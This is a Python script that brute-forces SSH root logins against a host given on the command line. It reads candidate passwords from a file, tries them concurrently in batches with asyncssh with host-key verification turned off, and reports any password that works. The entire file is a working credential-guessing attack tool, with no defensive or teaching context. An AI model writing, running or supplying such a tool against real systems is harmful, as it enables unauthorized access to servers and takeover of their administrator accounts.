import warnings
warnings.filterwarnings('ignore', 'Blowfish has been deprecated')
warnings.filterwarnings('ignore', 'CAST5 has been deprecated') 
warnings.filterwarnings('ignore', 'SEED has been deprecated')
warnings.simplefilter('ignore', DeprecationWarning)

import asyncio
import asyncssh
import sys
import logging

async def try_ssh_connection(host, username, password):
    try:
        await asyncio.sleep(0.5)
        async with asyncssh.connect(
            host, 
            username=username,
            password=password,
            known_hosts=None
        ) as conn:
            print(f'Success: {password}')
            return password
    except asyncssh.PermissionDenied:
        print(f"Permission denied with password: {password}")
    except asyncssh.ConnectionLost:
        print(f"Connection lost while trying password: {password}")
    except Exception as e:
        print(f"fail: {str(e)}, pwd: {password}")     
        return None

async def connection_worker(host, passwords, batch_size=10):
    tasks = []
    successful_passwords = []
    
    for i in range(0, len(passwords), batch_size):
        batch = passwords[i:i + batch_size]
        batch_tasks = [
            try_ssh_connection(host, 'root', password)
            for password in batch
        ]
        
        results = await asyncio.gather(*batch_tasks, return_exceptions=True)
        successful = [r for r in results if r is not None]
        successful_passwords.extend(successful)
        
        if successful_passwords:  # 성공한 비밀번호를 찾으면 즉시 반환
            return successful_passwords
            
    return successful_passwords

async def main(host, passwordList, max_concurrent=10):
    try:
        results = await connection_worker(host, passwordList, max_concurrent)
        return results
    except Exception as e:
        print(f"Main error: {e}")
        return []

if __name__ == '__main__':
    host = sys.argv[1]
    
    try:
        with open('passwordList.txt') as f:
            passwordList = [line.strip() for line in f.readlines()]
        
        results = asyncio.run(main(host, passwordList, max_concurrent=10))
        
        if results:
            print("\nSuccessful passwords found:")
            for password in results:
                print(password)
    except Exception as e:
        print(f"Error: {e}")